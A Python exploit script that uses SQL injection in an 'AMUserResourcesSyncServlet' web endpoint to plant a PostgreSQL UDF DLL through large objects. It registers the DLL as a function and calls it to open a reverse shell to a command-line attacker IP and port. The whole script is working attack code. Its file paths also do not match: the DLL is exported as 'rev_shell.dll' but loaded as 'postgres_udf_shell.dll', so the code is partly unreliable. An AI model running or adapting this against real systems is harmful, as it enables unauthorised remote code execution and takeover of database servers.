import requests, sys, urllib.request, urllib.parse, urllib.error, string, random, time
requests.packages.urllib3.disable_warnings()
import binascii

# encoded UDF dll
with open('postgres_udf_shell.dll', 'rb') as file:
    udf = binascii.hexlify(file.read())
loid = 1337

def log(msg):
   print(msg)

def make_request(url, sql):
   log(F"[*] Executing query: {sql}")
   r = requests.get( url % sql, verify=False)
   return r

def delete_lo(url, loid):
   log("[+] Deleting existing LO...")
   sql = F"SELECT lo_unlink({loid})"
   make_request(url, sql)

def create_lo(url, loid):
   log("[+] Creating LO for UDF injection...")
   sql = F"SELECT lo_import($$C:\\windows\\win.ini$$,{loid})"
   make_request(url, sql)
   
def inject_udf(url, loid):
   log(F"[+] Injecting payload of length {len(udf)} into LO...")
   for i in range(0,(int((len(udf)-1)/4096)+1)):
         udf_chunk = udf[i*4096:(i+1)*4096]
         if i == 0:
             sql = F"UPDATE PG_LARGEOBJECT SET data=decode($${udf_chunk}$$, $$hex$$) where loid={loid} and pageno={i}"
         else:
             sql = F"INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({loid}, {i}, decode($${udf_chunk}$$, $$hex$$))"
         make_request(url, sql)

def export_udf(url, loid):
   log("[+] Exporting UDF library to filesystem...")
   sql = F"SELECT lo_export({loid}, $$C:\\Users\\Public\\rev_shell.dll$$)"
   make_request(url, sql)
   
def create_udf_func(url):
   log("[+] Creating function...")
   sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\postgres_udf_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = F"select rev_shell($${ip}$$, {port})"
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print(F"[-] Usage: {sys.argv[0]} serverIP:port attackerIP port")
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   delete_lo(sqli_url, loid)   
   create_lo(sqli_url, loid)
   inject_udf(sqli_url, loid)
   export_udf(sqli_url, loid)
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)